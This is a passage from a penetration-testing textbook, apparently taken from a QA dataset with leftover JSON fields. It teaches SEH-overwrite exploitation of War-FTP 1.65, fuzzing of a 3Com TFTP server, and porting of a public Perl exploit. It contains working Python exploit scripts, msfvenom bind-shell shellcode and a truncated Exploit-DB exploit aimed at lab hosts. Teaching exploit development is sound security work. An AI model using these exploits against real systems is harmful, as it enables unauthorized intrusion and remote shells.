C:\\logs\\war-ftpd\\findmsp.txt, shown\nin part here, we find that the NSEH entry is overwritten 569 bytes into the\nattack string. Recall from Figure 18-1 that SEH chain entries are made up\nof eight bytes (the NSEH entry followed by the SEH pointer). Thus our SEH\noverwrite is at 573 bytes into our attack string (four bytes after NSEH). [+] Examining SEH chain\nSEH record (nseh field) at 0x00affd94 overwritten with normal pattern :\n0x41317441 (offset 569), followed by 577 bytes of cyclic data\nPassing Control to seh\nBack on the Windows XP target, the bottom of the Immunity Debugger\nscreen shows the access violation and also notes that you can type shift-\nF7/F8/F9 to pass an exception to the program. In this case, the program\nwill attempt to execute the memory address 41317441, the string that has\noverwritten SEH. Use shift-F9 to run the program until the next error\noccurs. As shown in Figure 18-8, the program receives an access violation\nwhen attempting to access the memory address 41317441. As in the previous\nexamples, we will put a useful memory address in the place of 41317441 to\nsuccessfully hijack execution. Also note in Figure 18-8 that when execution is passed to SEH, many\nof our registers have been zeroed out. This might make jumping to an\nattacker-controlled register more difficult. Figure 18-8: Execution is passed to the overwritten SEH. Structured Exception Handler Overwrites 407\nOf the registers that have not been zeroed out, none appears to point\nto a portion of our attack string. Clearly, a simple JMP ESP in SEH will not\nwork to redirect execution to attacker-controlled memory. Things are still\nlooking pretty bleak in our search for exploitability. Finding the attack string in memory\nOf course, in this case, we already have a working saved return pointer\noverwrite exploit. However, some programs will be vulnerable only to SEH\noverwrites, so developing a method to exploit these issues is of the utmost\nimportance. Luckily, an attacker-controlled memory address is on the hori-\nzon for SEH overwrites. As shown in Figure 18-9, highlight the ESP register\nin Immunity Debugger, right-click, and select Follow in Stack. Figure 18-9: Following ESP on the stack\nThough the contents of the ESP register do not point to any part of our\ncyclic pattern, two steps down from ESP, at ESP+8, we see that memory address\n00AFD94 points to our cyclic pattern in memory, as shown in Figure 18-10. If we\ncan find a way to remove two elements from the stack and then execute the\ncontents of this memory address, we can execute shellcode in place of\nthe pattern. 408 Chapter 18\nFigure 18-10: Cyclic pattern eight bytes higher than ESP\nThe location of NSEH is 00AFFD94, as noted by the output of Mona’s\nfindmsp command. We can verify this by right-clicking 00AFFD94 in the stack\npane and clicking Follow in Stack, as shown in Figure 18-11. Figure 18-11: Cyclic pattern in the pointer to the next SEH record\nStructured Exception Handler Overwrites 409\nAs discussed earlier, SEH entries are eight-byte-long linked lists con-\nsisting of a pointer to the next SEH record in the chain and the memory\naddress of the handler on the stack. If we can load ESP+8 into EIP, we can\nexecute some shellcode.\n\nUnfortunately, it looks like we have only four bytes\nto work with before we hit the SEH entry itself, but let’s deal with one prob-\nlem at a time. We need to find a viable way of getting to our shellcode, and\nthen we will return to making our shellcode fit into the space available. Before we move on, let’s verify that our offsets are correct, as shown in\nListing 18-3. #!/usr/bin/python\nimport socket\nbuffer = \"A\" * 569 + \"B\" * 4 + \"C\" * 4 + \"D\" * 573 u\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\nListing 18-3: Verifying overwrite offsets\nEdit your exploit program to send over 569 As, followed by 4 Bs, followed\nby 4 Cs, and rounding out the 1,150 byte attack string with 573 Ds at u. Restart War-FTP and run the exploit again. We see in Figure 18-12 that\nSEH is overwritten by our 4 Cs. Figure 18-12: SEH is overwritten by four Cs. 410 Chapter 18\nIf we again type shift-F9 to pass the exception handler to the crashed\nprogram, War-FTP crashes a second time when accessing the memory\naddress 43434343, our Cs. Now follow the ESP register in the stack. As shown\nin Figure 18-13, ESP+8 points to a memory address filled with the four Bs\nfollowed by our four Cs and then the Ds. Figure 18-13: ESP+8 is attacker controlled. Our offsets are correct. Now to find a way to redirect execution to ESP+8. Unfortunately, a simple JMP ESP won’t cut it this time. PoP PoP ret\nWe need an instruction, or series of instructions, that will allow us to move\neight bytes down the stack and then execute the contents of the memory\naddress located at ESP+8. To figure out the assembly instructions we need,\nwe must consider how the stack works. The stack is a last-in, first-out (LIFO) structure. The analogy of a stack\nof trays in a cafeteria is often used for this concept. The last tray put on the\nstack by cafeteria staff is the first one grabbed by a cafeteria patron. The\nassembly command equivalents of the tray being added to the stack and\nthen picked up by a patron are PUSH and POP, respectively. Recall that ESP points to the top (lowest memory address) of the cur-\nrent stack frame. If we use the POP instruction to pop one entry (four bytes)\noff the stack, ESP will now point to ESP+4. Thus, if we execute two POP\ninstructions in succession, ESP will now point to ESP+8, which is exactly\nwhat we are going for. Structured Exception Handler Overwrites 411\nFinally, to redirect our execution to our attacker-controlled string,\nwe need to load the value of ESP+8 (now in ESP after our two POP instruc-\ntions) into EIP (the next memory address to be executed). Luckily, there’s\nan instruction for that, namely, the RET instruction. By design, RET takes the\ncontents of the ESP register and loads them into EIP to be executed next. If we can find these three instructions, POP <some register>, POP <some\nregister>, RET (often abbreviated by exploit developers as POP POP RET), we\nshould be able to redirect the program’s execution by overwriting SEH with\nthe memory address of the first POP instruction. The contents of ESP will\nthen be popped into the register indicated by the instruction. We don’t par-\nticularly care which register gets the honor of holding the popped-off data,\nas long as it’s not ESP itself. We care only about burning things off the stack\nuntil we get to ESP+8. Next, the second POP instruction is executed. Now ESP points to the\noriginal ESP+8. Then, the RET instruction is executed, and ESP (ESP+8\nwhen the SEH was executed) is loaded into EIP. Recall from the previous\nsection that ESP+8 held a memory address that points to byte 569 of our\nattacker-controlled string. note As with JMP ESP, it is not a hard requirement that we find POP POP RET instructions. Logical equivalents, such as adding eight bytes to ESP followed by a RET and others,\nwould work just as well. Though this technique is a little more complicated, it’s similar to the\nsaved return pointer buffer overflow exercise we completed in Chapter 17. We are hijacking the program’s execution and redirecting it to our shell-\ncode. Now we need to find an instance of POP POP RET instructions in War-\nFTP or its executable modules. safeseh\nAs SEH overwrite attacks have become prevalent, Microsoft has come\nup with ways to stop them from working. One such example is SafeSEH. Programs compiled with SafeSEH record the memory locations that will be\nused for structured exception handling, which means that attempts to redi-\nrect execution to a memory location with POP POP RET instructions will fail\nthe SafeSEH check. It’s important to realize that even if DLLs in Windows XP SP2 and later\nare compiled with SafeSEH, third-party software doesn’t have to implement\nthis mitigation technique. If War-FTP or any of its custom DLLs do not use\nSafeSEH, we may not have to deal with this check. Mona will determine which modules are not compiled with SafeSEH\nin the process of finding the POP POP RET instructions when we use the com-\nmand !mona seh, as shown in Figure 18-14. 412 Chapter 18\nFigure 18-14: Running the SEH command in Mona\nThe results of !mona seh are written to C:\\logs\\war-ftpd\\seh.txt, as shown in\npart here. 0x5f401440 : pop edi # pop ebx # ret 0x04 | asciiprint,ascii {PAGE_EXECUTE_\nREAD} [MFC42.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: False,\nv4.2.6256 (C:\\Documents and Settings\\georgia\\Desktop\\MFC42.DLL)\n0x5f4021bf : pop ebx # pop ebp # ret 0x04 | {PAGE_EXECUTE_READ} [MFC42.DLL]\nASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256 (C:\\Documents\nand Settings\\georgia\\Desktop\\MFC42.DLL)\n0x5f4580ca : pop ebx # pop ebp # ret 0x04 | {PAGE_EXECUTE_READ} [MFC42.DLL]\nASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256 (C:\\Documents\nand Settings\\georgia\\Desktop\\MFC42.DLL)\n0x004012f2 : pop edi # pop esi # ret 0x04 | startnull {PAGE_EXECUTE_READ}\n[war-ftpd.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.6.5.0\n(C:\\Documents and Settings\\georgia\\Desktop\\war-ftpd.exe)\nAs you can see from the output, the only modules without SafeSEH\nare the War-FTP executable itself and a War-FTP-included DLL called\nMFC42.dll. We need to choose an instance of POP POP RET (or a logical\nequivalent) from Mona’s output that avoids the four bad characters dis-\ncussed in Chapter 17 (\\x00, \\x40, \\x0a, \\x0d). (To have Mona automatically\nexclude entries with bad characters during the search, enter !mona seh -cpb\n\"\\x00\\x40\\x0a\\x0d\". One such address is 5F4580CA. The instructions are POP EBX,\nPOP EBP, RET. Again, we don’t care where the instructions are stored, as long\nas we POP two entries off the stack. If we overwrite SEH with the address\n5F4580CA, these instructions will be executed, and we will redirect execution\nto our attack string. Structured Exception Handler Overwrites 413\nBefore we move on, set a breakpoint at 5F4580CA with bp 0x5F4580CA, as\nshown in Figure 18-15. Figure 18-15: Breakpoint at the POP POP RET\nReplace the four Cs in the previous exploit with the POP POP RET memory\naddress in little-endian format, as shown in Listing 18-4. #!/usr/bin/python\nimport socket\nbuffer = \"A\" * 569 + \"B\" * 4 + \"\\xCA\\x80\\x45\\x5F\" + \"D\" * 573\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\nListing 18-4: Replacing the SEH overwrite with POP POP RET\nNow run the exploit again. As you can see in Figure 18-16, the program\ncrashes again, and, as expected, SEH is overwritten with 5F4580CA. 414 Chapter 18\nFigure 18-16: SEH overwritten with a POP POP RET address\nType shift-F9 to let the program pass the overwritten exception han-\ndler. As expected, we hit our breakpoint, as shown in Figure 18-17. Figure 18-17: We hit our breakpoint. Structured Exception Handler Overwrites 415\nThe CPU pane (top left) shows that the next instructions to be exe-\ncuted are the POP POP RET. Press F7 to step through the instructions one at\na time, and watch what happens to the stack (bottom right) as you do. You\nwill see ESP move down to a higher address as we execute the POP instruc-\ntions. As you can see in Figure 18-18, when we execute the RET instruction\nwe end up in our attack string, at the pointer to the NSEH record, which is\ncurrently filled with four Bs. Figure 18-18: Execution is redirected to your attack string. We have solved our first problem: We have redirected the program’s\nexecution to our attack string. Unfortunately, as we can see in Figure 18-18,\nwe only have four useable bytes before we run into our SEH overwrite\naddress, 5F4580CA. We have a long string of Ds after the SEH address, but\ncurrently we are stuck with only four bytes to work with. We won’t be able\nto do much with only four bytes of shellcode. using a short Jump\nWe need to somehow bypass the return address and get to our long string\nof Ds, which has plenty of space for our final shellcode. We can use the short\njump assembly instruction to move EIP a short distance. This method is ideal\nfor our purposes because we need to jump over the four bytes of the SEH\noverwrite. The hexadecimal representation of a short jump is \\xEB <length to jump>. Padding the short jump instruction \\xEB <length to jump> with two bytes\nto take up all four bytes before the SEH overwrite, we can jump forward\nsix bytes over the padding and the SEH overwrite. 416 Chapter 18\nEdit the attack string to include a short jump, as shown in Listing 18-5. #!/usr/bin/python\nimport socket\nbuffer = \"A\" * 569 + \"\\xEB\\x06\" + \"B\" * 2 + \"\\xCA\\x80\\x45\\x5F\" + \"D\" * 570\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\nListing 18-5: Adding a short jump\nAs shown in Listing 18-5, this time we replace the NSEH (previously\nfour Bs) with \"\\xEB\\x06\" + \"B\" * 2. Reset your breakpoint at the POP POP RET\nbefore running the exploit again, and when you hit the breakpoint, step\nthrough the program line by line (F7) to see what is happening. Now after\nthe POP POP RET we have a six-byte short jump, as shown in Figure 18-19. Figure 18-19: Execution is redirected to the short jump. Now press F7 to execute the short jump. As shown in Figure 18-20, the\nshort jump successfully bypasses the SEH overwrite address and redirects\nexecution to the rest of our attack string (Ds).\n\nStructured Exception Handler Overwrites 417\nFigure 18-20: The short jump gets us past the SEH overwrite. Choosing a Payload\nWe have now redirected execution a second time, to a longer part of our\ncontrolled memory—an ideal place for our shellcode. Now to choose a pay-\nload and generate it with Msfvenom, as shown here. root@kali:~# msfvenom -p windows/shell_bind_tcp -s 573 -b '\\x00\\x40\\x0a\\x0d'\n[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)\nbuf =\n\"\\xbe\\xa5\\xfd\\x18\\xa6\\xd9\\xc6\\xd9\\x74\\x24\\xf4\\x5f\\x31\\xc9\" +\n--snip--\nRemember to tell Msfvenom to use a maximum size of 573 bytes and\nexclude our bad characters for the FTP username. (Again, you might be\nable to go a little bit longer, but our original exception occurs because we\nare writing off the end of the stack. We want to make sure all of our shell-\ncode is executed.)Now add the shellcode to our exploit in place of the Ds. To make the exploit long enough to trigger the SEH overwrite (instead of\nthe saved return pointer overwrite we saw in Chapter 17), pad the exploit\nstring out to 1,150 characters with Ds. The finished exploit is shown in\nListing 18-6. Our shellcode goes directly after our SEH overwrite. (In this\nexample, we again use a Windows bind shell.)\n#!/usr/bin/python\nimport socket\nshellcode = (\"\\xbe\\xa5\\xfd\\x18\\xa6\\xd9\\xc6\\xd9\\x74\\x24\\xf4\\x5f\\x31\\xc9\" +\n\"\\xb1\\x56\\x31\\x77\\x13\\x83\\xc7\\x04\\x03\\x77\\xaa\\x1f\\xed\\x5a\" +\n\"\\x5c\\x56\\x0e\\xa3\\x9c\\x09\\x86\\x46\\xad\\x1b\\xfc\\x03\\x9f\\xab\" +\n418 Chapter 18\n\"\\x76\\x41\\x13\\x47\\xda\\x72\\xa0\\x25\\xf3\\x75\\x01\\x83\\x25\\xbb\" +\n\"\\x92\\x25\\xea\\x17\\x50\\x27\\x96\\x65\\x84\\x87\\xa7\\xa5\\xd9\\xc6\" +\n\"\\xe0\\xd8\\x11\\x9a\\xb9\\x97\\x83\\x0b\\xcd\\xea\\x1f\\x2d\\x01\\x61\" +\n\"\\x1f\\x55\\x24\\xb6\\xeb\\xef\\x27\\xe7\\x43\\x7b\\x6f\\x1f\\xe8\\x23\" +\n\"\\x50\\x1e\\x3d\\x30\\xac\\x69\\x4a\\x83\\x46\\x68\\x9a\\xdd\\xa7\\x5a\" +\n--snip--\nbuffer = \"A\" * 569 + \"\\xEB\\x06\" + \"B\" * 2 + \"\\xCA\\x80\\x45\\x5F\" + shellcode + \"B\" * 205\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\nListing 18-6: The finished SEH overwrite exploit\nWhen War-FTP is attached to Immunity Debugger, we have to manually\ntell the debugger to pass SEH to the program. When we run War-FTP with-\nout a debugger and an error is encountered, execution is automatically passed\nto SEH, executing POP POP RET, the short jump, and finally our shellcode. summary\nWe have successfully built an SEH overwrite exploit for War-FTP. Though\nWar-FTP allowed us to exploit the buffer overflow vulnerability by directly\noverwriting a return address or SEH, some vulnerable programs will not\ncrash in a way that will allow you to control EIP but will allow you to over-\nwrite SEH. In such cases, knowing the steps to exploit this sort of crash is\nparamount to creating a working exploit. Due to the way structured excep-\ntion handlers work, you can count on NSEH being at ESP+8 every time\nyou encounter this type of crash. When you overwrite SEH, you will find\nthe pointer to the next SEH record at ESP+8. After executing a POP POP RET\nseries of instructions from a module that is not compiled with SafeSEH,\nyou will need to execute a short jump to get to your shellcode in the attack\nstring. If you continue in exploit development, you may run into another\nchallenge where \\xEB is a bad character, so you will need to find other ways\nof performing a jump. In the next chapter we will finish up our study of the basics of exploit\ndevelopment with a few odds and ends, such as first discovering a crash\nusing a technique called fuzzing, porting public exploit code to meet our\nneeds, and writing our own Metasploit modules. Structured Exception Handler Overwrites 419\n19\nfuz zing, Porting e xPloits,\nanD me tasPloit moDules\nIn this chapter, we will review a few more basic exploit\ndevelopment techniques. We will look at using a tech-\nnique called fuzzing to find potential exploits in vulner-\nable programs. We will also cover working with public\nexploit code and safely porting it to meet our needs, as\nwell the basics of building our own Metasploit modules. Finally, we will discuss some of the exploitation mitiga-\ntion techniques that our targets may have in place. Fuzzing Programs\nIn Chapter 17, we exploited War-FTP version 1.65’s Username field buffer\noverflow with a 1,100-byte exploit string. The natural question is, how did\nwe know that 1,100 As in the Username field would crash the program, and,\nmore importantly, how did security researchers find this vulnerability for\nthe first time? In some cases, source code for programs is publicly avail-\nable, so a researcher looking for vulnerabilities need only be well versed in\nsecure coding practices. In other cases, we can use a popular method called\nfuzzing to send various inputs to a program, hoping that something strange\nwill happen. Finding Bugs with Code Review\nIn Chapter 16, we used a short Linux program to illustrate a buffer overflow\nvulnerability. When auditing the source code of this program (as shown in\nListing 19-1), we see the strcpy function u. As discussed in that chapter, this\nfunction does no bounds checking and may be a security risk. #include <string.h>\n#include <stdio.h>\nvoid overflowed() {\nprintf(\"%s\\n\", \"Execution Hijacked\");\n}\nvoid function(char *str){\nchar buffer[5];\nstrcpy(buffer, str); u\n}\nvoid main(int argc, char *argv[])\n{\nfunction(argv[1]); v\nprintf(\"%s\\n\", \"Executed normally\");\n}\nListing 19-1: Vulnerable C code\nReading through this source code, we see that user input (the first pro-\ngram argument) is passed to function v. The user input is then copied into\na five-character string called buffer using strpy u. As we saw in Chapter 16,\nwe can exploit this behavior to create a stack-based buffer overflow. Fuzzing a Trivial FTP Server\nWhen we don’t have access to a program’s source code, we have to use other\nmethods to find potentially exploitable security issues. We can use fuzzing\nto send various inputs to the program that the developer never intended\nthe code to process. If we can find input that will manipulate memory in a\ncontrollable way, we may be able to exploit the program. In Chapter 17, when exploiting War-FTP 1.65, we first made the pro-\ngram crash by sending 1,100 As in the Username field. Once we determined\nthat EIP contained four As, as well as a long string of As from the ESP reg-\nister, we concluded that this issue was exploitable and proceeded to write a\nworking stack-based buffer overflow exploit. In the following example, we\nstart a step earlier and use fuzzing to determine how many As we need to\nsend to a program in order to crash it. 422 Chapter 19\nWe can use fuzzing techniques to trigger crashes, which we can\nuse to build exploits. Let’s look at an example of fuzzing a Trivial FTP\n(TFTP) server to find an exploitable vulnerability. We’ll use the 3Com\nTFTP server version 2.0.1, which we found on our Windows XP system\nduring post exploitation. TFTP runs by default on UDP port 69. Because it is connectionless, we\nwill need to know the syntax for TFTP communication to send UDP pack-\nets that the TFTP software will attempt to process. According to TFTP’s\nRequest for Comment (RFC) page, a proper TFTP packet is in the format\nshown in Listing 19-2. To get TFTP to respond to us, we need to follow this\nspecification. 2 bytes string 1 byte string 1 byte\n------------------------------------------------\n| Opcode | Filename | 0 | Mode | 0 |\n------------------------------------------------\nListing 19-2: TFTP packet format\nWhen considering stack-based buffer overflow attacks, look for places\nwhere the user controls the size and content of the input. If we can send\ninput that technically meets the TFTP specification but which contains input\nthat the code was not designed to process, we may be able to trigger a stack-\nbased buffer overflow vulnerability. In the case of this TFTP server, the first\nfield, Opcode, is always two bytes long and includes one of the following\nstrings:\nopcode operation\n01 Read request (RRQ)\n02 Write request (WRQ)\n03 Data (DATA)\n04 Acknowledgment (ACK)\n05 Error (ERROR)\nHowever, we can control the Filename field. In a real TFTP request,\nthis is where we would tell the server the filename we want to read, write,\nand so on. The length is variable and the contents of the string are user\ncontrolled, so this may be a good place to look for stack-based buffer over-\nflow vulnerabilities. For example, perhaps the author of the code was not\nexpecting anyone to enter a filename that is 1,000 characters long. After all,\nwho would want to type in a 1,000-character filename? The next field is a null byte, which signifies the end of the filename. We\ncan’t control this field, but we can control the fourth field, Mode, which is\na user-controlled variable string. According to the RFC, TFTP’s supported\nmodes include netascii, octet, and mail. This is an ideal place for us to fuzz,\nbecause developers are expecting only eight characters or less for this field. The TFTP packet ends with a null byte to signify the end of the Mode. Fuzzing, Porting Exploits, and Metasploit Modules 423\nAttempting a Crash\nFor our fuzzing exercise, we will craft a succession of legitimate TFTP pack-\nets with bogus and increasingly long input in the Mode field. If the TFTP\nprocesses the packets correctly, it should say the Mode is unrecognized and\nstop processing the packet. Perhaps if we can trigger a stack-based buffer\noverflow vulnerability, the results will be different, and we can cause the pro-\ngram to crash. To do this, we will again write a simple Python program. Instead of setting our buffer variable to a string of 1,100 As, as in the\nWar-FTP exploitation examples in Chapters 17 and 18, we’ll create an array\nof strings of variable length in Listing 19-3. #!/usr/bin/python\nimport socket\nbufferarray = [\"A\"*100] u\naddition = 200\nwhile len(bufferarray) <= 50: \nbufferarray.append(\"A\"*addition) w\naddition += 100\nfor value in bufferarray: x\ntftppacket = \"\\x00\\x02\" + \"Georgia\" + \"\\x00\" + value + \"\\x00\" y\nprint \"Fuzzing with length \" + str(len(value))\ns=socket.socket(socket.AF_INET, socket.SOCK_DGRAM) z\ns.sendto(tftppacket,('192.168.20.10',69))\nresponse = s.recvfrom(2048)\nprint response\nListing 19-3: A simple TFTP fuzzing program\nThe first entry in the array will be a string of 100 As u. But before we\nsend any packets to the TFTP server, let’s create the rest of the fuzzing\nstrings and append them to our array by adding new fuzzing strings in\nincrements of 100. Using a while loop, we will append progressively lon-\nger strings to the array until it is 50 elements long v. Each time we cycle\nthrough the while loop, a new element will be appended to the array w.",
    "question": "What is the process for exploiting a structured exception handler (SEH) overwrite in a Windows program like War-FTP?",
    "summary": "The text discusses exploiting a buffer overflow vulnerability in the War-FTP program by overwriting the structured exception handler (SEH) instead of the return address. It explains how to use a short jump instruction to bypass the SEH overwrite and redirect execution to shellcode. The process involves generating a payload with Msfvenom, modifying the exploit to fit the available space, and using tools like Immunity Debugger and Mona to identify and utilize the SEH overwrite."
  },
  {
    "start": 117,
    "end": 121,
    "text": "After we have created our fuzzing strings and the while loop exits, we will\nenter a for loop x, which will grab each element of the array in turn and\nsend it within the Mode field of a legitimate TFTP packet y. Our packet meets the specifications from the TFTP RFC. We have used\nthe mode 02 (write request) and the filename Georgia. Our string of As from\nthe array are put into the Mode field. Hopefully, one of our increasingly\nlong strings will cause a crash. Setting up our network socket is a little different from what we learned\nin the previous chapter when attacking FTP in Python. Because TFTP is a\nUDP protocol, we need to set up a UDP socket as opposed to a TCP socket,\nso the syntax is slightly different z. Save the Python code as tftpfuzzer, and\nmake it executable. Before we start sending fuzzing packets, switch back to your Windows\nXP machine and attach to the 3CTftpSvc process with Immunity Debugger,\nas shown in Figure 19-1. This will allow us to view the contents of memory\n424 Chapter 19\nif we cause a crash to verify whether we have gained control of EIP. (Don’t\nforget to tell the program to continue running by clicking the play button\nat the top of the Immunity Debugger window.)\nFigure 19-1: Attaching Immunity Debugger to the 3Com TFTP server\nNow, in Listing 19-4, we run the TFTP fuzzer program we created in\nListing 19-3. root@kali:~# ./tftpfuzzer\nFuzzing with length100\n('\\x00\\x05\\x00\\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00',u ('192.168.20.10', 4484))\nFuzzing with length 200\n('\\x00\\x05\\x00\\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00', ('192.168.20.10', 4485))\nFuzzing with length 300\n('\\x00\\x05\\x00\\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00', ('192.168.20.10', 4486))\nFuzzing with length 400\n('\\x00\\x05\\x00\\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00', ('192.168.20.10', 4487))\nFuzzing, Porting Exploits, and Metasploit Modules 425\nFuzzing with length 500\n('\\x00\\x05\\x00\\x04Unk\\x00', ('192.168.20.10', 4488))\nFuzzing with length 600 v\nListing 19-4: Fuzzing 3Com TFTP\nAs the program runs through the successive strings of As in the Mode\nfield, the TFTP server replies that it doesn’t know that transport mode u. When the fuzzing program attempts to fuzz with a length of 600, it receives\nno response from the TFTP server v, which leads us to believe that a trans-\nport mode of 500 As crashed the server, such that it could not respond to us\nwhen we sent over 600 As. Looking back at the 3Com TFTP server in Immunity Debugger\n(Figure 19-2), we see that it has crashed with 41414141 in EIP. Also note the\nshort string of As in the register ESP and the much longer string of As in the\nregister ESI. It seems that by sending over a string of 500 characters in the\nMode field, we can control execution and the contents of some memory reg-\nisters: an ideal situation for writing a stack-based buffer overflow exploit. Figure 19-2: 3Com TFTP has crashed. Using the techniques learned in the previous chapter when exploiting\nWar-FTP, see if you can develop a working exploit for the 3Com TFTP 2.0.1\nwithout help from the text. In this case, the saved return pointer overwrite\nis at the end of the exploit string, and the shellcode in ESI will be earlier in\nthe exploit string. (You’ll find a completed Python exploit for this exercise\nin “Writing Metasploit Modules” on page 432. Refer to that code if you get\nstuck.)\nTo restart 3Com TFTP after a crash, browse to C:\\Windows, open\n3CTftpSvcCtrl, and click Start Service, as shown in Figure 19-3. Then\nreattach to the new process in Immunity Debugger. 426 Chapter 19\nFigure 19-3: 3Com TFTP Service Control dialog\nPorting Public exploits to meet Your needs\nSometimes you may find an exploitable vulnerability on your pentest, but\nthere is no Metasploit module available to exploit it. While the Metasploit\nteam and contributing module writers from the community do an excellent\njob of keeping Metasploit up-to-date with current threats, not every known\nexploit on the Internet has been ported to the framework. We can attempt to develop a working exploit by downloading the target\nsoftware and developing a working exploit, but that approach is not always\nfeasible. The software in question may come with a license fee so expensive\nthat you would end up losing money on the pentest, or it may not be avail-\nable from the vendor or elsewhere. In addition, your pentest may have a\nlimited time frame, and so you would be better off looking for additional\nvulnerabilities in the environment rather than spending significant time on\ncustom-exploit development. One way to develop your own working exploits is to use publicly available\nexploits as a base and port them to your environment. Even if a vulnerabil-\nity lacks a corresponding Metasploit module, you may be able to find proof-\nof-concept exploit code on a website like Exploit Database (http://www\n.exploit-db.com/) or SecurityFocus (http://www.securityfocus.com/). Although\npublic exploit code should always be used with caution (not everything\nonline does what it says it does), with some due diligence, we can use public\nexploit code safely. Let’s start with a public exploit for the 3Com TFTP 2.0.1 long trans-\nport mode vulnerability from Exploit Database, found online at http://www\n.exploit-db.com/exploits/3388/ and shown in Listing 19-5. #!/usr/bin/perl –w u\n#===============================================================\n# 3Com TFTP Service <= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit\n# By Umesh Wanve (umesh_345@yahoo.com)\n#===============================================================\n# Credits : Liu Qixu is credited with the discovery of this vulnerability. Fuzzing, Porting Exploits, and Metasploit Modules 427\n# Reference : http://www.securityfocus.com/bid/21301\n# Date : 27-02-2007\n# Tested on Windows 2000 SP4 Server English v\n# Windows 2000 SP4 Professional English\n# You can replace shellcode with your favourite one :\n# Buffer overflow exists in transporting mode name of TFTP server. # So here you go. # Buffer = \"\\x00\\x02\" + \"filename\" + \"\\x00\" + nop sled + Shellcode + JUMP + \"\\x00\";\n# This was written for educational purpose. Use it at your own risk. Author will not be\n# responsible for any damage. #===============================================================\nuse IO::Socket;\nif(!($ARGV[1]))\n{\nprint \"\\n3COM Tftp long transport name exploit\\n\";\nprint \"\\tCoded by Umesh wanve\\n\\n\";\nprint \"Use: 3com_tftp.pl <host> <port>\\n\\n\";\nexit;\n}\n$target = IO::Socket::INET->new(Proto=>'udp',\nPeerAddr=>$ARGV[0],\nPeerPort=>$ARGV[1])\nor die \"Cannot connect to $ARGV[0] on port $ARGV[1]\";\n# win32_bind - EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com\nmy($shellcode)= w\n\"\\x31\\xc9\\x83\\xe9\\xb0\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x48\". \"\\xc8\\xb3\\x54\\x83\\xeb\\xfc\\xe2\\xf4\\xb4\\xa2\\x58\\x19\\xa0\\x31\\x4c\\xab\". \"\\xb7\\xa8\\x38\\x38\\x6c\\xec\\x38\\x11\\x74\\x43\\xcf\\x51\\x30\\xc9\\x5c\\xdf\". --snip--\n\"\\xc3\\x9f\\x4f\\xd7\\x8c\\xac\\x4c\\x82\\x1a\\x37\\x63\\x3c\\xb8\\x42\\xb7\\x0b\". \"\\x1b\\x37\\x65\\xab\\x98\\xc8\\xb3\\x54\";\nprint \"++ Building Malicious Packet .....\\n\";\n$nop=\"\\x90\" x 129;\n$jmp_2000 = \"\\x0e\\x08\\xe5\\x77\";x# jmp esi user32.dll windows 2000 sp4 english\n$exploit = \"\\x00\\x02\";y #write request (header)\n$exploit=$exploit.\"A\"; #file name\n$exploit=$exploit.\"\\x00\"; #Start of transporting name\n$exploit=$exploit.$nop;z #nop sled to land into shellcode\n$exploit=$exploit.$shellcode;{ #our Hell 